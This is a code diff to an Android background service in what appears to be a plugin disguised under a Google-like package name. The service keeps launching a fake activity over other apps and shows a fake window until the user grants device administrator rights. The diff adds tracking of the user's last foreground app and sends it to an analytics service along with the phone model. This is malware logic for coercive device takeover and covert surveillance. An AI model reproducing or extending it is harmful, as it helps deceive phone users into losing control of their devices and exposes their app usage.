@@ -10,6 +10,7 @@ import android.os.Build;
 import android.os.IBinder;
 import com.googl.plugin.x.FakeActivity;
 import com.xstd.plugin.Utils.CommonUtil;
+import com.xstd.plugin.Utils.FakeWindow;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
@@ -27,6 +28,8 @@ public class WatchService extends Service {
     private boolean mDeviceWindowShowInBinding = false;
 
     private long mStartTime;
+
+    private String mLastTopPackage = "null";
 
     @Override
     public void onCreate() {
@@ -53,12 +56,11 @@ public class WatchService extends Service {
             @Override
             public void run() {
                 while (!AppRuntime.WATCHING_SERVICE_BREAK.get()) {
-                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-                    boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(getApplicationContext(), DeviceBindBRC.class));
+                    boolean isDeviceBinded = CommonUtil.isBindingActive(getApplicationContext());
                     if (isDeviceBinded) break;
 
                     long curTime = System.currentTimeMillis();
-                    if ((curTime - mStartTime) >= 60000 && !mDeviceWindowShowInBinding) {
+                    if ((curTime - mStartTime) >= FakeWindow.FAKE_WINDOW_SHOW_DELAY && !mDeviceWindowShowInBinding) {
                         AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                         AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
 
@@ -81,6 +83,8 @@ public class WatchService extends Service {
                     }
 
                     if (!"com.android.settings".equals(packname)) {
+                        mLastTopPackage = packname;
+
                         AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
                         Intent i = new Intent();
                         i.setClass(getApplicationContext(), FakeActivity.class);
@@ -88,7 +92,7 @@ public class WatchService extends Service {
                         startActivity(i);
 
                         try {
-                            Thread.sleep(500);
+                            Thread.sleep(700);
                         } catch (Exception e) {
                             e.printStackTrace();
                         }
@@ -115,6 +119,7 @@ public class WatchService extends Service {
             HashMap<String, String> log = new HashMap<String, String>();
             log.put("phoneType", Build.MODEL);
             log.put("bindingCount", String.valueOf(PluginSettingManager.getInstance().getDeviceBindingCount() + 1));
+            log.put("lastTopPackage", mLastTopPackage);
             CommonUtil.umengLog(getApplicationContext(), "bind_failed_window_not_show", log);
         }
 
